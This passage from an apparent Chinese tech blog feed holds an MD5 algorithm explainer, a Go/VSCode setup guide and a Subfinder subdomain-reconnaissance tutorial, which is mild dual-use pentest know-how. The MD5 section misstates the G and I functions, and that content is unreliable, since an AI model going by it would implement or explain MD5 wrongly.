src="/2021/11/20/CTF/Crypto/Crypto/45dc898751a2af11929f9f4506445445.png" alt="image-20211123153415491"><img src="/2021/11/20/CTF/Crypto/Crypto/42cc6117d75d7eef7cce5e04a78bf19a.png" alt="image-20211123153458708"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/d3b09550b3c08a2fb6758a85a2a687c0.png" alt="image-20211123153606631"></p><h5 id="消息填充"><a href="#消息填充" class="headerlink" title="消息填充"></a>消息填充</h5><p>填充后的消息比特长度 L 为模 512 下是 448，也就是说 𝐿 ≡ 448 (𝑚𝑜𝑑 512)，或者说 𝐿 = 𝑛 × 512 + 448，n 为大于等于 1 的正整数。填充方式为第一位为 1，后面为 0. </p><h5 id="附加消息长度"><a href="#附加消息长度" class="headerlink" title="附加消息长度"></a>附加消息长度</h5><p>前面填充后最后有 448bit，448+64=512bit，留下的这 64bit 用于填写附加消息长度， 用 little-endian 方式存储。那么可存储的最大附加消息长度为 2^64，如果消息长度大于此数，存储长度模 2^64 后的值。 附加消息长度后，进行后续运算的消息长度是 512 的倍数。 </p><h5 id="缓冲区初始化"><a href="#缓冲区初始化" class="headerlink" title="缓冲区初始化"></a>缓冲区初始化</h5><p>初始化MD5核心算法中的𝑊0, 𝑋0, 𝑌0, 𝑍0，𝑊0 = 01 23 45 67；𝑋0 = 89 𝐴𝐵 𝐶𝐷 𝐸𝐹；𝑌0 = 𝐹𝐸 𝐷𝐶 𝐵𝐴 98；𝑍0 = 76 54 32 10 。</p><h5 id="分组流水处理"><a href="#分组流水处理" class="headerlink" title="分组流水处理"></a>分组流水处理</h5><p>将消息分为 n 个 512bit 长度的分组 𝑚1, 𝑚2, . . . , 𝑚𝑛，然后对 n 个分组依次执行： </p><ol><li><p>(𝑊1, 𝑋1, 𝑌1, 𝑍1) = 𝐻𝑀𝐷5 (𝑊0, 𝑋0, 𝑌0, 𝑍0, 𝑚1) </p></li><li><p>(𝑊2, 𝑋2, 𝑌2, 𝑍2) = 𝐻𝑀𝐷5 (𝑊1, 𝑋1, 𝑌1, 𝑍1, 𝑚2) </p></li><li><p>(𝑊3, 𝑋3, 𝑌3, 𝑍3) = 𝐻𝑀𝐷5 (𝑊2, 𝑋2, 𝑌2, 𝑍2, 𝑚3) </p><p>·····························</p></li><li><p>(𝑊𝑛, 𝑋𝑛, 𝑌𝑛, 𝑍𝑛) = 𝐻𝑀𝐷5 (𝑊𝑛−1, 𝑋𝑛−1, 𝑌𝑛−1, 𝑍𝑛−1, 𝑚𝑛) </p></li></ol><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>MD5 的输出为 𝑊𝑛||𝑋𝑛||𝑌𝑛||𝑍𝑛。 </p><h5 id="MD5-算法表示"><a href="#MD5-算法表示" class="headerlink" title="MD5 算法表示"></a>MD5 算法表示</h5><p>整个 MD5 算法，输入为原始消息 𝑀𝑠，初始量𝑊0, 𝑋0, 𝑌0, 𝑍0，输出为 128bit，𝑊||𝑋||𝑌 ||𝑍， 我们记为 (𝑊, 𝑋, 𝑌, 𝑍) 𝑜𝑟 𝑊||𝑋||𝑌 ||𝑍 = 𝑀𝐷5(𝑊0, 𝑋0, 𝑌0, 𝑍0, 𝑀𝑠). </p><h4 id="核心算法HMD5"><a href="#核心算法HMD5" class="headerlink" title="核心算法HMD5"></a>核心算法HMD5</h4><p>核心算法 𝐻𝑀𝐷5 是个分组算法，输入是 512 位的分组数据，输出是 128 位。 </p><h5 id="HMD5-算法"><a href="#HMD5-算法" class="headerlink" title="HMD5 算法"></a>HMD5 算法</h5><p>𝐻𝑀𝐷5 算法的伪代码如下：<br>𝑀, 𝑊0, 𝑋0, 𝑌0, 𝑍0<br>(𝑊1, 𝑋1, 𝑌1, 𝑍1) = 𝑅(𝐹, 𝐺, 𝐻, 𝐼, 𝑊0, 𝑋0, 𝑌0, 𝑍0, 𝑀)<br>𝑊 = 𝑊0 + 𝑊1 (𝑚𝑜𝑑 2^32)<br>𝑋 = 𝑋0 + 𝑋1 (𝑚𝑜𝑑 2^32)<br>𝑌 = 𝑌0 + 𝑌1 (𝑚𝑜𝑑 2^32)<br>𝑍 = 𝑍0 + 𝑍1 (𝑚𝑜𝑑 2^32)<br>输出 W,X,Y,Z</p><p>上面伪代码表示的这个算法，其输入是 𝑀, 𝑊0, 𝑋0, 𝑌0, 𝑍0，算法输出是 W, X, Y, Z, 用 (𝑊, 𝑋, 𝑌, 𝑋) = 𝐻𝑀𝐷5 (𝑊0, 𝑋0, 𝑌0, 𝑍0, 𝑀) 符号化来表示。 </p><h5 id="四轮运算-R"><a href="#四轮运算-R" class="headerlink" title="四轮运算 R"></a>四轮运算 R</h5><p>算法的输入是512bit的消息M，我们再将其分为16组，每组32bit，𝑀 = 𝑀0||𝑀1||𝑀2|| . . . ||𝑀15, 然后对其进行四轮核心运算。我们将整个四轮运算过程记为 𝑅(𝐹, 𝐺, 𝐻, 𝐼, 𝑊, 𝑋, 𝑌, 𝑍, 𝑀) : 𝑊 × 𝑋 × 𝑌 × 𝑍 × 𝑀 → 𝑊 × 𝑋 × 𝑌 × 𝑍, 也就是说这四轮运算后输出是新的 W,X,Y,X, 下面我们看看四轮运算的具体过程</p><ul><li>第一轮 C 为 F, 所以核心运算是 FF(W,X,Y,Z,M,s,t)，在第一轮中依次对 16 个分组数 据执行 FF 运算，也就是说第一轮执行 16 次 FF 运算，每一次的执行 FF 时，W,X,Y,X 是上 一次运算后的 W,X,Y,X，在执行第一次 FF 时，W,X,Y,X 的初始值为，𝑊 = 0𝑥01234567, 𝑋 = 0𝑥89𝑎𝑏𝑐𝑑𝑒 𝑓 , 𝑌 = 0𝑥 𝑓 𝑒𝑑𝑐𝑏𝑎98, 𝑍 = 0𝑥76543210. 我们用伪代码描述此轮算法：<br>W,X,Y,Z 初始化<br>for i=0 to 15<br>𝐹𝐹(𝑊, 𝑋, 𝑌, 𝑍, 𝑀1 𝑖 , 𝑠1 𝑖 , 𝑡𝑖+1)<br>𝑊 𝑋𝑌 𝑍 = 𝑊 𝑋𝑌 𝑍 &gt;&gt; 32; 表示将四个值连接，然后右循环移位 32， 也就是新 W 值为旧 Z，新 X 值为旧 W，新 Y 值为旧 X，新 Z 值为旧 Y</li><li>第二轮 C 为 G：<br>W,X,Y,Z 上一轮遗留值<br>for i=0 to 15<br>𝐺𝐺(𝑊, 𝑋, 𝑌, 𝑍, 𝑀2 𝑖 , 𝑠2 𝑖 , 𝑡𝑖+17)<br>𝑊 𝑋𝑌 𝑍 = 𝑊 𝑋𝑌 𝑍 &gt;&gt; 32; 表示将四个值连接，然后右循环移位 32， 也就是新 W 值为旧 Z，新 X 值为旧 W，新 Y 值为旧 X，新 Z 值为旧 Y</li><li>第三轮 C 为 H：<br>W,X,Y,Z 上一轮遗留值<br>for i=0 to 15<br>𝐻𝐻(𝑊, 𝑋, 𝑌, 𝑍, 𝑀3 𝑖 , 𝑠3 𝑖 , 𝑡𝑖+33)<br>𝑊 𝑋𝑌 𝑍 = 𝑊 𝑋𝑌 𝑍 &gt;&gt; 32; 表示将四个值连接，然后右循环移位 32， 也就是新 W 值为旧 Z，新 X 值为旧 W，新 Y 值为旧 X，新 Z 值为旧 Y</li><li>第四轮 C 为 I：<br>W,X,Y,Z 上一轮遗留值<br>for i=0 to 15<br>𝐼 𝐼(𝑊, 𝑋, 𝑌, 𝑍, 𝑀4 𝑖 , 𝑠4 𝑖 , 𝑡𝑖+49)<br>𝑊 𝑋𝑌 𝑍 = 𝑊 𝑋𝑌 𝑍 &gt;&gt; 32; 表示将四个值连接，然后右循环移位 32， 也就是新 W 值为旧 Z，新 X 值为旧 W，新 Y 值为旧 X，新 Z 值为旧 Y </li></ul><h5 id="R-中的-𝑀𝑛-𝑖-𝑛-1-2-3-4"><a href="#R-中的-𝑀𝑛-𝑖-𝑛-1-2-3-4" class="headerlink" title="R 中的 𝑀𝑛 𝑖 , (𝑛 = 1, 2, 3, 4)"></a>R 中的 𝑀𝑛 𝑖 , (𝑛 = 1, 2, 3, 4)</h5><p>四轮运算中，每轮消息顺序不同，第一轮为顺次，消息从 𝑀0, 𝑀2, . . . , 𝑀15，第二、三、 四轮，对 M 的顺序进行了置换：<br>第一轮 𝑀1 𝑖 = 𝑀𝑖 , 𝑖 = 0, 1, . . . , 15<br>第二轮 𝑀2 𝑖 = 𝑀1+5𝑖 𝑚𝑜𝑑 16, 𝑖 = 0, 1, . . . , 15<br>第三轮 𝑀3 𝑖 = 𝑀5+3𝑖 𝑚𝑜𝑑 16, 𝑖 = 0, 1, . . . , 15<br>第四轮 𝑀4 𝑖 = 𝑀7𝑖 𝑚𝑜𝑑 16, 𝑖 = 0, 1, . . . , 15 </p><p>按上面公式，可知，第二轮 M 的顺序是： 𝑀1, 𝑀6, 𝑀11, 𝑀0, 𝑀5, 𝑀10, 𝑀15, 𝑀4, 𝑀9, 𝑀14, 𝑀3, 𝑀8, 𝑀13, 𝑀2, 𝑀7, 𝑀12 </p><h5 id="R-中的-𝑠-𝑛-𝑖-𝑛-1-2-3-4"><a href="#R-中的-𝑠-𝑛-𝑖-𝑛-1-2-3-4" class="headerlink" title="R 中的 𝑠 𝑛 𝑖 , (𝑛 = 1, 2, 3, 4)"></a>R 中的 𝑠 𝑛 𝑖 , (𝑛 = 1, 2, 3, 4)</h5><p>每轮每次运算移位数 𝑠 𝑛 𝑖 的取值如表7.1，n 表示时第几轮，i 表示是本轮的第几次运算。 </p><h5 id="R-中的-𝑡𝑖"><a href="#R-中的-𝑡𝑖" class="headerlink" title="R 中的 𝑡𝑖"></a>R 中的 𝑡𝑖</h5><p>每轮中的每次运算都有 𝑡𝑖，他是个常数，在四轮运算中其是顺序变换，共有 64 个常 数值 𝑡1, 𝑡2, . . . , 𝑡64，我们这样设定这个常数值,𝑡𝑖 = [2 32 × 𝑎𝑏𝑠(𝑠𝑖𝑛(𝑖))], 其中 i 的单位为弧度 (RAD)，[] 表示取整运算，就是取一个数的整数部分，abs 是绝对值，其实我们可以事 先做好这个常数表，以备计算是使用，下面我们计算 𝑡1。 </p><p>𝑡1 = [2 32 × 𝑎𝑏𝑠(𝑠𝑖𝑛(1))] = [3614090360.3] = 3614090360 = [𝑑76𝑎𝑎478]16 </p><p>表 7.1: MD5 中循环移位操作参数选择</p><p> 轮数 参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 1 7 12 17 22 7 12 17 22 7 12 17 22 7 12 17 22 2 5 9 14 20 5 9 14 20 5 9 14 20 5 9 14 20 3 4 11 16 23 4 11 16 23 4 11 16 23 4 11 16 23 4 6 10 15 21 6 10 15 21 6 10 15 21 6 10 15 21 </p><h5 id="核心运算"><a href="#核心运算" class="headerlink" title="核心运算"></a>核心运算</h5><p>我们定义一个核心运算，其中 C 为非线性函数 F,G,H,I 中的一个，𝑑 &lt;&lt; 𝑠 表示对数 d 循环左移 s 位，+ 表示模 2^32 加法，后面为了方便我们直接写 +，核心运算 CC 我们定 义为： </p><p>𝐶𝐶(𝑊, 𝑋, 𝑌, 𝑍, 𝑀, 𝑠, 𝑡) : 𝑊 = 𝑋 + ( (𝑊 + 𝐶(𝑋, 𝑌, 𝑍) + 𝑀 + 𝑡) &lt;&lt; 𝑠) (7.1) </p><p>如果 C 用 F 替换，那么核心运算 CC 就是 FF；如果 C 用 G 替换，那么核心运算 CC 就是 GG；如果 C 用 H 替换，那么核心运算 CC 就是 HH；如果 C 用 I 替换，那么核心运 算 CC 就是 II。 </p><p>这里我们其实是定义了 R 运算中的函数 FF、GG、HH、II。 </p><h5 id="非线性函数"><a href="#非线性函数" class="headerlink" title="非线性函数"></a>非线性函数</h5><p>在核心运算定义中有四个非线性函数 𝐹(𝑋, 𝑌, 𝑍), 𝐺(𝑋, 𝑌, 𝑍), 𝐻(𝑋, 𝑌, 𝑍), 𝐼(𝑋, 𝑌, 𝑍)， 下面我们分别定义这四个非线性函数。 </p><p>我们定义四个非线性函数，其中 X，Y，Z 是 32bit 数,∧ 是与操作，∨ 是或操作,⊕ 是 异或操作，¬ 是非操作。 </p><ol><li>𝐹(𝑋, 𝑌, 𝑍) = (𝑋 ∧ 𝑌) ∨ (¬𝑋 ∧ 𝑍) </li><li>𝐺(𝑋, 𝑌, 𝑍) = (𝑋 ∧ 𝑍) ∨ (¬𝑌 ∧ ¬𝑍) </li><li>𝐻(𝑋, 𝑌, 𝑍) = 𝑋 ⊕ 𝑌 ⊕ 𝑍 </li><li>𝐼(𝑋, 𝑌, 𝑍) = 𝑌 ⊕ (𝑋 ∧ ¬𝑍) </li></ol>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go-VScode</title>
    <link href="/2021/10/11/Code/Go/Go-VScode/"/>
    <url>/2021/10/11/Code/Go/Go-VScode/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-VScode"><a href="#Go-VScode" class="headerlink" title="Go-VScode"></a>Go-VScode</h1><h2 id="Go环境"><a href="#Go环境" class="headerlink" title="Go环境"></a>Go环境</h2><h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>Go官网下载地址：<a href="https://golang.org/dl/">https://golang.org/dl/</a></p><p>Go官方镜像网站（推荐）：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><p>下载安装完成后，<code>cmd</code> 验证是否安装成功：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; go version<br>go version go1.<span class="hljs-number">17.2</span> windows/amd64<br></code></pre></td></tr></table></figure><h3 id="配置-GOPATH"><a href="#配置-GOPATH" class="headerlink" title="配置 GOPATH"></a>配置 GOPATH</h3><p>这步不是必须的，可以根据自己的情况来决定是否跳过。</p><p>Go 开发包在安装完成后会为 <code>GOPATH</code> （工程目录）设置一个默认目录（Windows下为： <code>%USERPROFILE%\go</code> ），这里我改成其他目录。</p><p>修改用户变量：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">变量名:</span> <span class="hljs-string">GOPATH</span><br><span class="hljs-string">变量值:</span> <span class="hljs-string">D:\Go</span><br></code></pre></td></tr></table></figure><p>在 <code>D:\Go</code> 下新建 <code>bin、pkg、src</code> 三个文件夹。</p><p>同时，我们可以将 <code>GOPATH</code> 下的 <code>bin</code> 目录添加到系统变量 <code>Path</code> 中，以便后面更方便的使用。</p><h3 id="配置-Goproxy-环境变量"><a href="#配置-Goproxy-环境变量" class="headerlink" title="配置 Goproxy 环境变量"></a>配置 Goproxy 环境变量</h3><blockquote><p>这步主要是因为 Go的一些依赖包挂在Google和GitHub上，国内访问会有些问题，VSCode安装插件后需要安装一些工具，这时如果不进行配置的话，就会下载失败。</p></blockquote><p>Goproxy官网： <a href="https://goproxy.io/">GOPROXY.IO - A Global Proxy for Go Modules</a></p><p>这里介绍Windows下使配置长久生效的做法（这样就不用每次都去配置环境变量了），其他的可以去官网查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1. 右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量<br>2. 在 “[你的用户名]的用户变量” 中点击 ”新建“ 按钮<br>3. 在 “变量名” 输入框中新增 “GOPROXY”<br>4. 在对应的 “变量值” 输入框中新增 “https://goproxy.io,direct”<br>5. 最后点击 “确定” 按钮保存设置<br></code></pre></td></tr></table></figure><p>配置完成后，<code>cmd</code> 验证是否配置成功：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt; go env<br><span class="hljs-built_in">set</span> GO111MODULE=<br><span class="hljs-built_in">set</span> GOARCH=amd64<br><span class="hljs-built_in">set</span> GOBIN=<br><span class="hljs-built_in">set</span> GOCACHE=C:\Users\<span class="hljs-number">13562</span>\AppData\Local\go<span class="hljs-literal">-build</span><br><span class="hljs-built_in">set</span> GOENV=C:\Users\<span class="hljs-number">13562</span>\AppData\Roaming\go\env<br><span class="hljs-built_in">set</span> GOEXE=.exe<br><span class="hljs-built_in">set</span> GOEXPERIMENT=<br><span class="hljs-built_in">set</span> GOFLAGS=<br><span class="hljs-built_in">set</span> GOHOSTARCH=amd64<br><span class="hljs-built_in">set</span> GOHOSTOS=windows<br><span class="hljs-built_in">set</span> GOINSECURE=<br><span class="hljs-built_in">set</span> GOMODCACHE=D:\Go\pkg\mod<br><span class="hljs-built_in">set</span> GONOPROXY=<br><span class="hljs-built_in">set</span> GONOSUMDB=<br><span class="hljs-built_in">set</span> GOOS=windows<br><span class="hljs-built_in">set</span> GOPATH=D:\Go<br><span class="hljs-built_in">set</span> GOPRIVATE=<br><span class="hljs-built_in">set</span> GOPROXY=https://goproxy.io,direct<br><span class="hljs-built_in">set</span> GOROOT=C:\Program Files\Go<br><span class="hljs-built_in">set</span> GOSUMDB=sum.golang.org<br><span class="hljs-built_in">set</span> GOTMPDIR=<br><span class="hljs-built_in">set</span> GOTOOLDIR=C:\Program Files\Go\pkg\tool\windows_amd64<br><span class="hljs-built_in">set</span> GOVCS=<br><span class="hljs-built_in">set</span> GOVERSION=go1.<span class="hljs-number">17.2</span><br><span class="hljs-built_in">set</span> GCCGO=gccgo<br><span class="hljs-built_in">set</span> AR=ar<br><span class="hljs-built_in">set</span> CC=gcc<br><span class="hljs-built_in">set</span> CXX=g++<br><span class="hljs-built_in">set</span> CGO_ENABLED=<span class="hljs-number">1</span><br><span class="hljs-built_in">set</span> GOMOD=NUL<br><span class="hljs-built_in">set</span> CGO_CFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_CPPFLAGS=<br><span class="hljs-built_in">set</span> CGO_CXXFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_FFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> CGO_LDFLAGS=<span class="hljs-literal">-g</span> <span class="hljs-literal">-O2</span><br><span class="hljs-built_in">set</span> PKG_CONFIG=pkg<span class="hljs-literal">-config</span><br><span class="hljs-built_in">set</span> GOGCCFLAGS=<span class="hljs-literal">-m64</span> <span class="hljs-literal">-mthreads</span> <span class="hljs-literal">-fmessage</span><span class="hljs-literal">-length</span>=<span class="hljs-number">0</span> <span class="hljs-literal">-fdebug</span><span class="hljs-literal">-prefix</span><span class="hljs-literal">-map</span>=C:\Users\<span class="hljs-number">13562</span>\AppData\Local\Temp\go<span class="hljs-literal">-build3293688615</span>=/tmp/go<span class="hljs-literal">-build</span> <span class="hljs-literal">-gno</span><span class="hljs-literal">-record</span><span class="hljs-literal">-gcc</span><span class="hljs-literal">-switches</span><br><br></code></pre></td></tr></table></figure><p>这里，我们可以看到我们的所有配置，包括 <code>GOPATH</code> 和 <code>GOROOT</code> 。</p><h2 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h2><h3 id="安装插件和工具"><a href="#安装插件和工具" class="headerlink" title="安装插件和工具"></a>安装插件和工具</h3><p>1、安装 Go插件</p><p>2、安装成功后，在我们创建的 <code>src</code> 中创建一个项目文件 <code>Hello</code>，通过 <code>VSCode</code> 打开，新建 <code>Helloworld.go</code> 文件，这时会提示我们缺少工具，我们点 <code>install all</code> 就行，等待安装完成 。</p><h3 id="编写运行Hello-World"><a href="#编写运行Hello-World" class="headerlink" title="编写运行Hello World"></a>编写运行Hello World</h3><p>编写 <code>Helloworld.go</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <span class="hljs-comment">// 声明 main 包，表明当前是一个可执行程序</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <span class="hljs-comment">// 导入内置 fmt 包</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">// main函数，是程序执行的入口</span><br>    fmt.Println(<span class="hljs-string">&quot;Hello World!&quot;</span>)  <span class="hljs-comment">// 在终端打印 Hello World!</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行 <code>Helloworld.go</code> ：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\Go\src\Hello&gt; go run .\Helloworld.go<br>Hello World!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>VScode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
      <tag>VScode</tag>
      
      <tag>env</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Subfinder</title>
    <link href="/2021/10/11/HW/Tools/Subfinder/"/>
    <url>/2021/10/11/HW/Tools/Subfinder/</url>
    
    <content type="html"><![CDATA[<h1 id="Subfinder"><a href="#Subfinder" class="headerlink" title="Subfinder"></a>Subfinder</h1><p>subfinder 是由 GO 语言开发的一款子域名收集工具，除了 DNS 枚举之外，集成了多个在线网站的域名查询功能，包括：Binaryedge，Certspotter，Censys，Chaos，DnsDB，Github，Intelx，Passivetotal，Recon.dev，Robtex，SecurityTrails，Shodan，Spyse，Threatbook，Virustotal，Zoomeye</p><p>GitHub项目地址：<a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>一个汇集了 7 种 API 的子域发现工具，可通过使用被动的在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。subfinder 仅用于做一件事，那就是被动子域枚举。</p><h2 id="Subfinder-1"><a href="#Subfinder-1" class="headerlink" title="Subfinder"></a>Subfinder</h2><p>一个子域发现工具，可通过使用被动的在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。subfinder 仅用于做一件事，那就是被动子域枚举。</p><p>在获得了 APIKEY 后，可进行全方面的被动式子域发现，为渗透测试人员提供服务。</p><h2 id="特征✨"><a href="#特征✨" class="headerlink" title="特征✨"></a>特征✨</h2><ul><li>模块化架构</li><li>速度快、轻量级资源</li><li>丰富的被动源（截至目前已有26个源）</li><li>支持集成 Stdin和 stdout</li><li>多种输出格式</li></ul><h2 id="安装❗"><a href="#安装❗" class="headerlink" title="安装❗"></a>安装❗</h2><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></p><p>使用版本：v2.2.4</p><p>环境：win10</p><blockquote><p>直接安装需 go1.13+ 才能成功安装！</p></blockquote><p><strong>Docker 一键部署</strong></p><p>先拉取官方镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker pull ice3man/subfinder<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker run -it ice3man/subfinder<br></code></pre></td></tr></table></figure><p>提示没有提供输入列表，运行命令后面接参数指令即可，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">docker run -it ice3man/subfinder -h<br></code></pre></td></tr></table></figure><p>显示帮助菜单。</p><ul><li>-config API密钥等的配置文件</li><li>-d 查找子域</li><li>-dL 包含要枚举的域列表的文件</li><li>-exclude-sources 清单中要排除的来源清单</li><li>-max-time 等待枚举结果的分钟数（默认为10）</li><li>-nC 不要在输出中使用颜色</li><li>-nW 从输出中删除通配符和失效子域</li><li>-o 输出到指定文件（可选）</li><li>-oD 将枚举结果写入指定目录（可选）</li><li>-oI 以Host，IP格式写入输出</li><li>-oJ 以JSON行格式写入输出</li><li>-r 以逗号分隔的要使用的解析程序列表</li><li>-rL 包含要使用的解析器列表的文本文件</li><li>-silent 仅显示输出中的子域</li><li>-sources 用逗号分隔的来源列表</li><li>-t 用于解析的并发 goroutine 的数量（默认为10）</li><li>-timeout 超时时间（默认为30）</li><li>-v 显示详细输出</li></ul><p>Windows 下还可以自己下载 exe 文件运行。</p><p>下载地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder/releases">https://github.com/projectdiscovery/subfinder/releases</a></p><p>运行方式：cmd 跳转到其相同目录，然后：（例如命令 -h）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">subfinder-windows-amd64.exe -h<br></code></pre></td></tr></table></figure><h2 id="使用-API"><a href="#使用-API" class="headerlink" title="使用 API"></a>使用 API</h2><ul><li><a href="https://link.zhihu.com/?target=https%3A//www.virustotal.com/">Virustotal</a></li><li><a href="https://link.zhihu.com/?target=http%3A//passivetotal.org/">Passivetotal</a></li><li><a href="https://link.zhihu.com/?target=http%3A//securitytrails.com/">SecurityTrails</a></li><li><a href="https://link.zhihu.com/?target=https%3A//censys.io/">Censys</a></li><li><a href="https://link.zhihu.com/?target=https%3A//binaryedge.io/">Binaryedge</a></li><li><a href="https://link.zhihu.com/?target=https%3A//shodan.io/">Shodan</a></li><li><a href="https://link.zhihu.com/?target=https%3A//urlscan.io/">URLScan</a></li></ul><p>需要注册其帐号，获取 APIKEY，然后调用即可。说得有点啰嗦，直接看下面的操作吧。</p><p>例如，先获取 shodan 的 APIKEY：</p><p>进入 shodan 官网：<a href="https://link.zhihu.com/?target=https%3A//www.shodan.io/">https://www.shodan.io/</a> 并登录。进入“我的账户”：</p><p><img src="https://pic4.zhimg.com/80/v2-37763752a113d14d1aaee8e6e80872f3_1440w.jpg" alt="img"></p><p>获取 APIKEY：</p><p><img src="https://pic2.zhimg.com/80/v2-c9be9d1fc0baf5209ac9deb691900071_1440w.jpg" alt="img"></p><p>然后，创建文件：<strong>config.yaml</strong></p><p><strong>demo：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs text">resolvers:<br>  - 1.1.1.1<br>  - 1.0.0.1<br>  - 8.8.8.8<br>  - 8.8.4.4<br>  - 9.9.9.9<br>  - 9.9.9.10<br>  - 77.88.8.8<br>  - 77.88.8.1<br>  - 208.67.222.222<br>  - 208.67.220.220<br>sources:<br>  - archiveis<br>  - binaryedge<br>  - bufferover<br>  - censys<br>  - certspotter<br>  - certspotterold<br>  - commoncrawl<br>  - crtsh<br>  - digicert<br>  - dnsdumpster<br>  - entrust<br>  - googleter<br>  - hackertarget<br>  - ipv4info<br>  - passivetotal<br>  - securitytrails<br>  - shodan<br>  - sitedossier<br>  - threatcrowd<br>  - threatminer<br>  - urlscan<br>  - virustotal<br>  - waybackarchive<br>binaryedge: []<br>censys: []<br>certspotter: []<br>passivetotal: []<br>securitytrails: []<br>shodan: []<br>urlscan: []<br>virustotal: []<br></code></pre></td></tr></table></figure><p>将 APIKEY 填入【】中并保存，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">subfinder-windows-amd64.exe -config config.yaml -d example.com<br></code></pre></td></tr></table></figure><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><p>安装方式(go 版本要求为 1.14+)：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 